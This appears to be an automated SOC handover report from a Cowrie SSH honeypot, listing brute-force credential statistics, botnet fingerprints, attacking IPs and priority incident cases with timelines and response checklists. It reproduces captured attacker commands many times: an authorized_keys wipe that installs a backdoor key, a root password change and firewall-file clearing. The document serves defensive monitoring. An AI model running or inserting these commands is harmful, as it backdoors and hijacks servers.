# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-25 |
| **Generated At** | 2026-05-25T23:09:36Z |
| **Shift Time** | 23:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **266** |
| Confirmed Threats | **260** |
| False Positives Filtered | **6** (2.3%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **8** |
| High Severity Cases | **53** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **213** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **134** |
| Unique Credential Pairs | **52** |
| Unique Usernames | **28** |
| Unique Passwords | **47** |
| Successful Auth Pairs | **34** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 53 |
| `345gs5662d34` | 24 |
| `ubuntu` | 4 |
| `GET / HTTP/1.0` | 3 |
| `OPTIONS / HTTP/1.0` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 26 |
| `345gs5662d34` | 24 |
| `` | 15 |
| `fjbdfdjkdsfs541544AA@@` | 4 |
| `fjbdfdjkdsfs541544@@` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 26 |
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `fjbdfdjkdsfs541544@@` | 4 |
| `GET / HTTP/1.0` | `` | 3 |
| `OPTIONS / HTTP/1.0` | `` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `online` | `120.48.39.73` | 2026-05-25T22:04:10 |
| `root` | `3245gs5662d34` | `120.48.39.73` | 2026-05-25T22:04:21 |
| `root` | `fjbdfdjkdsfs541544@@` | `180.100.198.68` | 2026-05-25T22:08:40 |
| `root` | `3245gs5662d34` | `180.100.198.68` | 2026-05-25T22:08:44 |
| `root` | `test12!` | `120.48.123.76` | 2026-05-25T22:10:10 |
| `root` | `3245gs5662d34` | `120.48.123.76` | 2026-05-25T22:10:22 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `183.166.94.133` | 2026-05-25T22:14:23 |
| `root` | `3245gs5662d34` | `183.166.94.133` | 2026-05-25T22:14:27 |
| `root` | `fjbdfdjkdsfs541544@@` | `118.186.7.9` | 2026-05-25T22:15:03 |
| `root` | `3245gs5662d34` | `118.186.7.9` | 2026-05-25T22:15:07 |
| `root` | `fjbdfdjkdsfs541544@@` | `183.166.94.133` | 2026-05-25T22:15:59 |
| `root` | `Root@123` | `183.166.94.133` | 2026-05-25T22:18:19 |
| `root` | `qwe123456.` | `183.166.94.133` | 2026-05-25T22:19:06 |
| `root` | `ruijie@123` | `183.166.94.133` | 2026-05-25T22:19:55 |
| `root` | `kiki` | `128.78.143.196` | 2026-05-25T22:21:37 |
| `root` | `3245gs5662d34` | `128.78.143.196` | 2026-05-25T22:21:42 |
| `root` | `Cs123456` | `183.166.94.133` | 2026-05-25T22:22:14 |
| `root` | `12345678.` | `128.78.143.196` | 2026-05-25T22:22:52 |
| `root` | `!1qaz@2wsx` | `128.78.143.196` | 2026-05-25T22:24:03 |
| `root` | `test@123` | `183.166.94.133` | 2026-05-25T22:24:29 |
| `root` | `qwert123` | `183.166.94.133` | 2026-05-25T22:25:17 |
| `root` | `Test2024` | `183.166.94.133` | 2026-05-25T22:26:02 |
| `root` | `Server2026@` | `128.78.143.196` | 2026-05-25T22:27:54 |
| `root` | `Ab123456+` | `120.48.53.156` | 2026-05-25T22:29:16 |
| `root` | `3245gs5662d34` | `120.48.53.156` | 2026-05-25T22:29:29 |
| `root` | `Test2024` | `128.78.143.196` | 2026-05-25T22:32:40 |
| `root` | `P@$$w0rd` | `120.48.53.156` | 2026-05-25T22:34:33 |
| `root` | `iddqdidkfa` | `128.78.143.196` | 2026-05-25T22:35:39 |
| `root` | `Hola1234` | `120.48.53.156` | 2026-05-25T22:37:46 |
| `root` | `!Q2w3e4r5t6y` | `128.78.143.196` | 2026-05-25T22:38:29 |
| `root` | `Apple123` | `120.48.53.156` | 2026-05-25T22:38:48 |
| `root` | `fjbdfdjkdsfs541544@@` | `128.78.143.196` | 2026-05-25T22:39:33 |
| `root` | `Abcd.1234` | `128.78.143.196` | 2026-05-25T22:40:25 |
| `root` | `Rd123456` | `128.78.143.196` | 2026-05-25T22:41:30 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **266** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 116 |
| Nmap scanner | 14 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 97 | 4 |
| `e788c657d1a2...` | Mirai/variant | 12 | 1 |
| `03a80b21afa8...` | Modern SSH client | 9 | 3 |
| `a20aced7c982...` | Mirai/variant | 2 | 1 |
| `b4b8ae3d7241...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 97 | 4 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 12 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 9 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `a20aced7c982...` | Nmap scanner | 2 | 1 | Mirai/variant |
| `b4b8ae3d7241...` | libssh | 2 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 26 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:kEm956h8lYu9"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `128.78.143.196`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.39.73`, `128.78.143.196`, `120.48.123.76`, `183.166.94.133`, `118.186.7.9`, `120.48.53.156`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **14** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | LOW |
| `AS396982` | Google LLC | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS3462` | Data Communication Business Group | 1 | LOW |
| `AS43370` | OBIT-telecommunications, LLC | 1 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (53)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d470316296da

| Field | Detail |
|---|---|
| **Source IP** | `120.48.39[.]73` |
| **First Seen** | 2026-05-25 22:04 |
| **Last Seen** | 2026-05-25 22:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:04:07` | `cowrie.session.connect` |
| `2026-05-25 22:04:07` | `cowrie.client.version` |
| `2026-05-25 22:04:09` | `cowrie.client.kex` |
| `2026-05-25 22:04:10` | `cowrie.login.success` |
| `2026-05-25 22:04:11` | `cowrie.session.params` |
| `2026-05-25 22:04:11` | `cowrie.command.input` |
| `2026-05-25 22:04:11` | `cowrie.command.failed` |
| `2026-05-25 22:04:11` | `cowrie.log.closed` |
| `2026-05-25 22:04:12` | `cowrie.session.params` |
| `2026-05-25 22:04:12` | `cowrie.command.input` |
| `2026-05-25 22:04:15` | `cowrie.session.file_download` |
| `2026-05-25 22:04:15` | `cowrie.log.closed` |
| `2026-05-25 22:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.39[.]73` to AbuseIPDB if not already reported
- [ ] Block `120.48.39[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdae72264331

| Field | Detail |
|---|---|
| **Source IP** | `120.48.39[.]73` |
| **First Seen** | 2026-05-25 22:04 |
| **Last Seen** | 2026-05-25 22:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:04:18` | `cowrie.session.connect` |
| `2026-05-25 22:04:18` | `cowrie.client.version` |
| `2026-05-25 22:04:18` | `cowrie.client.kex` |
| `2026-05-25 22:04:21` | `cowrie.login.success` |
| `2026-05-25 22:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.39[.]73` to AbuseIPDB if not already reported
- [ ] Block `120.48.39[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29d46b8754f7

| Field | Detail |
|---|---|
| **Source IP** | `180.100.198[.]68` |
| **First Seen** | 2026-05-25 22:08 |
| **Last Seen** | 2026-05-25 22:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:08:40` | `cowrie.session.connect` |
| `2026-05-25 22:08:40` | `cowrie.client.version` |
| `2026-05-25 22:08:40` | `cowrie.client.kex` |
| `2026-05-25 22:08:40` | `cowrie.login.success` |
| `2026-05-25 22:08:41` | `cowrie.session.params` |
| `2026-05-25 22:08:41` | `cowrie.command.input` |
| `2026-05-25 22:08:41` | `cowrie.command.failed` |
| `2026-05-25 22:08:41` | `cowrie.log.closed` |
| `2026-05-25 22:08:41` | `cowrie.session.params` |
| `2026-05-25 22:08:41` | `cowrie.command.input` |
| `2026-05-25 22:08:41` | `cowrie.session.file_download` |
| `2026-05-25 22:08:41` | `cowrie.log.closed` |
| `2026-05-25 22:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.100.198[.]68` to AbuseIPDB if not already reported
- [ ] Block `180.100.198[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8f4645b541

| Field | Detail |
|---|---|
| **Source IP** | `180.100.198[.]68` |
| **First Seen** | 2026-05-25 22:08 |
| **Last Seen** | 2026-05-25 22:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:08:43` | `cowrie.session.connect` |
| `2026-05-25 22:08:43` | `cowrie.client.version` |
| `2026-05-25 22:08:44` | `cowrie.client.kex` |
| `2026-05-25 22:08:44` | `cowrie.login.success` |
| `2026-05-25 22:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.100.198[.]68` to AbuseIPDB if not already reported
- [ ] Block `180.100.198[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01e851c7c000

| Field | Detail |
|---|---|
| **Source IP** | `120.48.123[.]76` |
| **First Seen** | 2026-05-25 22:10 |
| **Last Seen** | 2026-05-25 22:10 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:10:08` | `cowrie.session.connect` |
| `2026-05-25 22:10:08` | `cowrie.client.version` |
| `2026-05-25 22:10:09` | `cowrie.client.kex` |
| `2026-05-25 22:10:10` | `cowrie.login.success` |
| `2026-05-25 22:10:11` | `cowrie.session.params` |
| `2026-05-25 22:10:11` | `cowrie.command.input` |
| `2026-05-25 22:10:11` | `cowrie.command.failed` |
| `2026-05-25 22:10:11` | `cowrie.log.closed` |
| `2026-05-25 22:10:11` | `cowrie.session.params` |
| `2026-05-25 22:10:11` | `cowrie.command.input` |
| `2026-05-25 22:10:11` | `cowrie.session.file_download` |
| `2026-05-25 22:10:11` | `cowrie.log.closed` |
| `2026-05-25 22:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.123[.]76` to AbuseIPDB if not already reported
- [ ] Block `120.48.123[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eb70a43e70c

| Field | Detail |
|---|---|
| **Source IP** | `120.48.123[.]76` |
| **First Seen** | 2026-05-25 22:10 |
| **Last Seen** | 2026-05-25 22:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:10:20` | `cowrie.session.connect` |
| `2026-05-25 22:10:20` | `cowrie.client.version` |
| `2026-05-25 22:10:20` | `cowrie.client.kex` |
| `2026-05-25 22:10:22` | `cowrie.login.success` |
| `2026-05-25 22:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.123[.]76` to AbuseIPDB if not already reported
- [ ] Block `120.48.123[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12126622c963

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:14 |
| **Last Seen** | 2026-05-25 22:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:14:22` | `cowrie.session.connect` |
| `2026-05-25 22:14:22` | `cowrie.client.version` |
| `2026-05-25 22:14:22` | `cowrie.client.kex` |
| `2026-05-25 22:14:23` | `cowrie.login.success` |
| `2026-05-25 22:14:23` | `cowrie.session.params` |
| `2026-05-25 22:14:23` | `cowrie.command.input` |
| `2026-05-25 22:14:23` | `cowrie.command.failed` |
| `2026-05-25 22:14:24` | `cowrie.log.closed` |
| `2026-05-25 22:14:24` | `cowrie.session.params` |
| `2026-05-25 22:14:24` | `cowrie.command.input` |
| `2026-05-25 22:14:24` | `cowrie.session.file_download` |
| `2026-05-25 22:14:24` | `cowrie.log.closed` |
| `2026-05-25 22:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfcb4c533f32

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:14 |
| **Last Seen** | 2026-05-25 22:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:14:26` | `cowrie.session.connect` |
| `2026-05-25 22:14:26` | `cowrie.client.version` |
| `2026-05-25 22:14:26` | `cowrie.client.kex` |
| `2026-05-25 22:14:27` | `cowrie.login.success` |
| `2026-05-25 22:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f00591ba0ed

| Field | Detail |
|---|---|
| **Source IP** | `118.186.7[.]9` |
| **First Seen** | 2026-05-25 22:15 |
| **Last Seen** | 2026-05-25 22:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:15:02` | `cowrie.session.connect` |
| `2026-05-25 22:15:02` | `cowrie.client.version` |
| `2026-05-25 22:15:02` | `cowrie.client.kex` |
| `2026-05-25 22:15:03` | `cowrie.login.success` |
| `2026-05-25 22:15:03` | `cowrie.session.params` |
| `2026-05-25 22:15:03` | `cowrie.command.input` |
| `2026-05-25 22:15:03` | `cowrie.command.failed` |
| `2026-05-25 22:15:03` | `cowrie.log.closed` |
| `2026-05-25 22:15:04` | `cowrie.session.params` |
| `2026-05-25 22:15:04` | `cowrie.command.input` |
| `2026-05-25 22:15:04` | `cowrie.session.file_download` |
| `2026-05-25 22:15:04` | `cowrie.log.closed` |
| `2026-05-25 22:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.7[.]9` to AbuseIPDB if not already reported
- [ ] Block `118.186.7[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5516b7ae65d5

| Field | Detail |
|---|---|
| **Source IP** | `118.186.7[.]9` |
| **First Seen** | 2026-05-25 22:15 |
| **Last Seen** | 2026-05-25 22:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:15:06` | `cowrie.session.connect` |
| `2026-05-25 22:15:06` | `cowrie.client.version` |
| `2026-05-25 22:15:06` | `cowrie.client.kex` |
| `2026-05-25 22:15:07` | `cowrie.login.success` |
| `2026-05-25 22:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.7[.]9` to AbuseIPDB if not already reported
- [ ] Block `118.186.7[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-540bba421b83

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:15 |
| **Last Seen** | 2026-05-25 22:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:15:58` | `cowrie.session.connect` |
| `2026-05-25 22:15:58` | `cowrie.client.version` |
| `2026-05-25 22:15:59` | `cowrie.client.kex` |
| `2026-05-25 22:15:59` | `cowrie.login.success` |
| `2026-05-25 22:15:59` | `cowrie.session.params` |
| `2026-05-25 22:15:59` | `cowrie.command.input` |
| `2026-05-25 22:15:59` | `cowrie.command.failed` |
| `2026-05-25 22:16:00` | `cowrie.log.closed` |
| `2026-05-25 22:16:00` | `cowrie.session.params` |
| `2026-05-25 22:16:00` | `cowrie.command.input` |
